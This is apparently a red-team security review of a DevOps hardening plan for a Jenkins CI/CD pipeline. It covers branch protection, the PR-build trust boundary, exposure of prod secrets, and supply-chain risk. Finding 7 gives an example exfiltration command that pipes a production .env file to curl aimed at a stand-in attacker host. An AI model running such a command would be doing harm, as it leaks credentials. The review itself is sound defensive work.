# Security Adversary Red-Team Review — DevOps Tier-1 Hardening Plan

Reviewer role: Security Adversary + Fact Checker + Contract Verifier.
Scope: `plans/260703-0022-devops-tier1-hardening/{plan.md, phase-01..04}.md`.
Verification method: grep/glob against the live repo, not the plan's prose.

## Finding 1: Uncoordinated concurrent plan collision on the exact deploy files this plan hardens

- **Severity:** Critical
- **Location:** plan.md, "File ownership" section (lines 39-47); all of Phase 1 and Phase 3
- **Flaw:** A second `pending`, `high-risk` plan — `plans/260703-0052-dev-prod-cicd-environments/plan.md` — lists as "Files Likely To Change": `docker/docker-compose.prod.tls.yml`, `docker/docker-compose.jenkins.yml`, `Jenkinsfile`, `scripts/prod-server-deploy.sh` (plan.md:127-131). These are the identical files Phase 1 and Phase 3 of *this* plan modify (`ensure-origin-cert.sh` wiring, certbot `profiles: ['le']`, `publishChecks`). Plan 260703-0022's `relatedPlans`/context section never references 260703-0052, and 260703-0052's `relatedPlans` (plan.md:11-13) references two *other* plans, not this one. Neither plan's file-ownership table accounts for the other.
- **Failure scenario:** Both plans get authored/merged independently (both are `pending`, same day, same author). Plan 260703-0052 restructures the Jenkinsfile into a branch-conditional dev/deploy split and adds a `docker/docker-compose.dev.tls.yml`; if it merges after or in parallel with this plan's `publishChecks`/`ensure-origin-cert.sh` edits, the branch-split rewrite can silently drop the `catchError`-wrapped checks reporting, the certbot `profiles: ['le']` gate, or the resource-limit blocks Phase 1-3 introduce here — with no compile-time signal (Groovy/YAML merge conflicts are line-based, not semantic). Because Phase 3's branch-protection is being wired to *require* `CMCnew CI`, a bad merge that silently breaks `publishChecks` produces the "required check never posts → all PRs permanently blocked" failure mode the plan's own risk table (plan.md:66) calls "High if ordered wrong" — except here it's triggered by a *sibling plan*, not this plan's own sequencing.
- **Evidence:** `plans/260703-0052-dev-prod-cicd-environments/plan.md:127-131` (Files Likely To Change) vs. `plans/260703-0022-devops-tier1-hardening/plan.md:41-47` (File ownership) — zero cross-references between the two documents. VERIFIED via Read of both files.
- **Suggested fix:** Add 260703-0052 to this plan's context/relatedPlans, and explicitly sequence (this plan lands and is soak-validated on prod BEFORE 260703-0052's Jenkinsfile branch-split begins), or merge the two plans' Jenkinsfile/compose changes as one coordinated change set.

## Finding 2: Branch-protection script blindly overwrites existing settings with a destructive PUT

- **Severity:** Critical
- **Location:** Phase 3, section 3 "GitHub branch protection — scripted required check" (phase-03-ci-merge-gate.md:37-56)
- **Flaw:** `scripts/setup-github-required-check.sh` does a `gh api --method PUT .../branches/main/protection` with a hardcoded JSON body that sets `"required_pull_request_reviews": null` and `"restrictions": null` (phase-03-ci-merge-gate.md:47-48). The GitHub branch-protection PUT endpoint **replaces the entire protection object** — it does not merge/patch. The script never does a `GET` first to check whether `main` already has PR-review requirements, admin-restriction rules, or other protections configured.
- **Failure scenario:** If `main` currently has *any* required-review rule (even a default GitHub org policy, or one configured outside this repo's tracked scripts — unverifiable from the repo per the plan's own "Unresolved questions" §1), running this script silently deletes it and replaces it with review-less, unrestricted protection whose only gate is the new `CMCnew CI` status check. Since `Jenkinsfile:44` deploys to live prod on every green `main` build, this converts "PR review + green CI required to touch prod" into "green CI alone (which is spoofable per Finding 3/4) is sufficient to deploy to prod" — a direct authorization-boundary weakening on the single production gate, introduced by an idempotent-looking one-shot script with no current-state check or diff/confirm step.
- **Evidence:** phase-03-ci-merge-gate.md:42-51 (verbatim JSON body); AGENTS.md states "main chỉ nhận thay đổi qua Pull Request đã review" (branch workflow, line 5) — i.e., review is an *assumed existing* control this script can silently erase. No `gh api GET .../protection` step exists anywhere in Phase 3. UNVERIFIED whether `main` currently has protection (repo-side state, not discoverable via local grep) — this is exactly why a blind PUT is unsafe.
- **Suggested fix:** `GET` current protection first, merge in only `required_status_checks`, and abort/diff-confirm if other fields (`required_pull_request_reviews`, `restrictions`) are already non-null rather than silently nulling them.

## Finding 3: Trust boundary for PR-triggered builds is expanded, never assessed

- **Severity:** High
- **Location:** Phase 3, section 1 (Jenkinsfile publishChecks) and jenkins-casc.yaml PR-discovery config
- **Flaw:** `jenkins-casc.yaml:48` enables `gitHubPullRequestDiscovery { strategyId(1) }`, meaning Jenkins builds a pipeline **defined by the Jenkinsfile inside the PR itself** for every opened PR. The `github-token` credential (`jenkins-casc.yaml:22-25`, description "GitHub PAT (SCM + checks)") is already bound into every such build for SCM checkout. Phase 3 now requires this same token to additionally carry `checks:write` (phase-03-ci-merge-gate.md:35: "If missing, regenerate the PAT with `repo` scope"), and wires `credentialsId: 'github-token'` directly into `publishChecks` calls that run on **every PR build, including changeRequest() builds** (Jenkinsfile:37 already gates `Integration tests` on `anyOf { branch 'main'; changeRequest() }`, confirming PR builds execute real pipeline code, not just a stub).
- **Failure scenario:** Any actor able to open a PR against this repo (contributor, or compromised branch) can put arbitrary Groovy in the Jenkinsfile of that PR. Because Jenkins agent is `agent any` on the single controller with the host docker socket mounted (`docker-compose.jenkins.yml:29`, `user: root`) and `/root/cmcnew/.env.production` mounted read-only into the Jenkins container (`docker-compose.jenkins.yml:35`), a malicious Jenkinsfile edit in a PR can `sh 'cat /secrets/.env.production'` or exfiltrate the `github-token` credential (now scoped to `checks:write`, i.e. broader than before) to an attacker-controlled endpoint. This is not newly *introduced* by this plan, but the plan actively widens the token's required scope and volume of use (every PR now triggers a publishChecks call using it) without the cross-cutting risk table (plan.md:62-70) mentioning this trust boundary at all.
- **Evidence:** `docker/jenkins-casc.yaml:22-25,47-48`; `docker/docker-compose.jenkins.yml:17,29,35`; `Jenkinsfile:37`. All VERIFIED by direct read.
- **Suggested fix:** Restrict PR discovery to internal/trusted branches only (no fork PRs — confirm this is already the case, since `strategyId(1)` alone does not disambiguate fork vs. same-repo without a `ForkPullRequestDiscoveryTrait`, which is absent here so likely same-repo-only, but this should be stated explicitly as a verified assumption in the plan, not left implicit). At minimum, add a line to the plan's risk table acknowledging the token-scope expansion under an already-PR-buildable pipeline.

## Finding 4: `catchError`-wrapped publishChecks can silently strand the required check in "pending" forever

- **Severity:** High
- **Location:** Phase 3, section 1 "Fault-tolerance" (phase-03-ci-merge-gate.md:24); Phase 4 Step 2
- **Flaw:** The plan wraps every `publishChecks` call in `catchError(buildResult: null, stageResult: 'UNSTABLE')` so "a checks-API hiccup never fails the pipeline." This is applied to *both* the `IN_PROGRESS` start call and the `COMPLETED` end call. If the start call succeeds but the end call fails (e.g., transient GitHub API 5xx, PAT scope drift after a manual token rotation, plugin hiccup), the check is stuck at `IN_PROGRESS` on GitHub forever, while Jenkins itself reports the build as `SUCCESS`/green internally (because the error was caught) — nothing in the pipeline surfaces this divergence.
- **Failure scenario:** Once Phase 4 Step 2 enables the required-check gate (`contexts: ["CMCnew CI"]`, `strict: true`), a stuck-pending check permanently blocks that PR's merge with no operator-visible signal in Jenkins (build shows green). This directly reproduces the exact failure mode the plan's own risk table calls out ("Required check enabled before it ever posts → all PRs blocked", plan.md:66) — except the plan's mitigation (Phase 4 Step 1: "prove posting on a real PR before enabling") only proves the happy path posts once; it does not test or guard the split-failure case that `catchError` is specifically designed to permit.
- **Evidence:** phase-03-ci-merge-gate.md:20-24 (start/end call design); phase-03-ci-merge-gate.md:79-82 (risk table lists PAT-scope-403 risk but not stuck-IN_PROGRESS risk); Phase 4 §Step 1-2 (phase-04-rollout-validation.md:18-27) tests only forced-red and forced-green outcomes, not a mid-flight publish failure.
- **Suggested fix:** Add a fallback: if the `COMPLETED` publishChecks call itself fails inside its own `catchError`, emit a loud Jenkins-console `error()`-level log (still non-fatal to the build) and/or a periodic reconciliation check, so an operator has a signal distinct from "build was green."

## Finding 5: Phase 2's redis sizing/eviction rationale is based on a workload that does not exist

- **Severity:** Medium
- **Location:** Phase 2, "Proposed limits" table, redis row (phase-02-resource-limits.md:35)
- **Flaw:** The plan sizes redis as "Session/cache only" and adds `--maxmemory 200mb --maxmemory-policy allkeys-lru` "so redis self-evicts before the cgroup OOMKills it." Grepping `apps/api/src` for any redis client usage (`ioredis`, `createClient`, `redis.`) returns **zero hits** outside `rate-limit.ts`, and that file's own comment explicitly states: *"An in-memory counter is therefore exactly as accurate as a Redis-backed one would be... the declared-but-unused REDIS_URL"* — i.e., redis is provisioned in compose but the API currently does not talk to it for sessions, cache, or rate-limiting at all.
- **Failure scenario:** Not an outage risk today (redis is idle), but the plan's stated rationale for the 256m/200mb ceiling and `allkeys-lru` policy is fabricated against non-existent traffic. When redis is eventually wired up (the same comment flags SSE fan-out as the trigger), nobody will re-review these numbers because Phase 2's "Done =" criteria (line 75) declares them "tuned-and-locked." A future SSE/session workload landing under an already-"locked" 200mb allkeys-lru ceiling — sized for zero-traffic hypotheticals — risks exactly the eviction/DoS class of bug the ceiling was supposed to prevent, but for a workload the plan never analyzed.
- **Evidence:** `apps/api/src/rate-limit.ts:7-9` ("declared-but-unused REDIS_URL"); grep for `redis|ioredis|createClient` across `apps/api/src` = 1 file, `rate-limit.ts`, which uses none of them (in-process `Map`). VERIFIED.
- **Suggested fix:** State explicitly in Phase 2 that redis is currently unused and the limit is a placeholder ceiling, not a tuned-for-workload number; flag for mandatory re-review when redis is first wired to real traffic (link to the rate-limit.ts comment as the trigger).

## Finding 6: Cert-generation step pulls unpinned packages from a public mirror on the prod deploy hot path

- **Severity:** Medium
- **Location:** Phase 1, section 1 "New single-source cert helper" (phase-01-tls-reconciliation.md:34); mirrors existing `scripts/prod-server-deploy.sh:27`
- **Flaw:** `ensure-origin-cert.sh` (and the code it's extracted from) runs `apk add --no-cache openssl` inside a throwaway `alpine` container, unauthenticated/unpinned, fetching from Alpine's public CDN, as part of every Jenkins deploy to `main` (Phase 1 §2: replaces `Jenkinsfile:51`'s volume-create with this script, which now runs unconditionally on every prod deploy, not just first-bootstrap).
- **Failure scenario:** (a) Availability: if the Alpine package mirror is unreachable/rate-limits/serves a broken index at deploy time, every `main` merge's deploy stage fails on a step whose only job is idempotent cert-verification of an *already-present* cert — an unnecessary new single point of failure on the deploy hot path for a step that, per the plan's own "Step 3" in Phase 4 (phase-04-rollout-validation.md:32), should be a no-op "verify + pass" on live prod. (b) Supply chain: no version/hash pin on the `openssl` package pulled at deploy time means a compromised or MITM'd Alpine mirror (this box is Cloudflare-proxied but the *deploy* egress to Alpine's CDN is not) could inject a malicious `openssl` binary invoked on a cert-handling code path, on every single deploy, indefinitely.
- **Evidence:** `scripts/prod-server-deploy.sh:26-27` (current pattern being extracted verbatim per phase-01 §1: "same invocation as today"); phase-01-tls-reconciliation.md:34. VERIFIED.
- **Suggested fix:** Pin the alpine base image by digest and/or skip the `apk add` entirely when the cert already exists and is valid (only invoke openssl when actually generating — the plan's step 2 already gates cert *generation* on absence, but the container/package-install itself should also be skippable on the "cert present, just verify" path, or use a pre-built image with openssl baked in rather than installing at every invocation).

## Finding 7: Prod secrets are readable from any PR-triggered Jenkins build; plan never assesses this despite touching the CI trust boundary directly

- **Severity:** High
- **Location:** Cross-cutting (Phase 3 adds new required-check trust to this same pipeline); `docker-compose.jenkins.yml:35`
- **Flaw:** `docker-compose.jenkins.yml:35` mounts `/root/cmcnew/.env.production:/secrets/.env.production:ro` into the Jenkins container — full prod secrets (DB password, `JWT_SECRET`, `GRAPH_CLIENT_SECRET`, `CALLIO_API_TOKEN`, SSO client secret; see `docker-compose.prod.tls.yml:56-80`) available to **any pipeline stage**, including `Lint + Typecheck` and `Integration tests`, which run unconditionally on every PR (`Jenkinsfile:23,37`) — not gated to `branch 'main'`. Phase 3 is specifically about making this pipeline's output authoritative for merge decisions (the reviewer now trusts "green CI" as a security-relevant gate per Finding 2), which raises the stakes of this pipeline's own integrity, yet no phase in this plan reviews or restricts secret exposure inside PR-triggered stages.
- **Failure scenario:** A PR (from any contributor with push/PR rights) modifies the Jenkinsfile's `Lint + Typecheck` stage to `sh 'cat /secrets/.env.production | curl -X POST attacker.example/exfil -d @-'`. This runs on `changeRequest()` before any human review gates it (the PR triggers the build automatically per `gitHubPullRequestDiscovery`), leaking every prod credential. This is a pre-existing condition, but this plan is the one converting "CI is green" into "CI is a required merge gate" (Finding 2) — it should have treated the pipeline's own secret-exposure surface as in-scope, since the plan's stated goal is exactly to make this pipeline authoritative for what reaches prod.
- **Evidence:** `docker/docker-compose.jenkins.yml:35`; `docker/docker-compose.prod.tls.yml:56-80` (secret env vars materialized into `.env.production`); `Jenkinsfile:23,37` (stages that run on `changeRequest()` with no secrets-scoping). VERIFIED.
- **Suggested fix:** At minimum, document this as an accepted risk in the plan's cross-cutting risk table (currently absent) since Phase 3 changes what "green CI" is trusted to mean; ideally, scope `.env.production` mount access away from PR-triggered stages (e.g., only bind-mount it in the `Build + Deploy` stage which is already `branch 'main'`-gated, not container-wide).
